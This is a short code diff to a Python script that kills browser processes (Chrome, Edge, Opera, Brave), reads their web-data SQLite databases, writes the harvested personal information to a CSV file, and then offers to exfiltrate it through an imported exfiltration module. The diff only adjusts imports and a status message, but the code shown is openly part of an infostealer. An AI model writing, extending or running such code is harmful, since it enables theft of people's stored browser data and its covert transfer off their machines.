@@ -1,7 +1,7 @@
 
 import sqlite3
 import csv
-import os
+import os,sys
 import subprocess
 from pathlib import Path
 from exfiltration import exfiltrate
@@ -73,13 +73,11 @@ def get_info(browser,kill,web_data):
     except sqlite3.OperationalError:
         print(browser + " Database not found")
          
-    print("[+] Written data to personal_info.csv")
-    
 get_info("Chrome","chrome.exe",CHROME_PATH)
 get_info("Edge","msedge.exe",EDGE_PATH)
 get_info("Opera","opera.exe",OPERA_PATH)
 get_info("Brave","brave.exe",BRAVE_PATH)
-print('\n')
+print("[+] Written data to personal_info.csv")
 info.close()
 
 exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
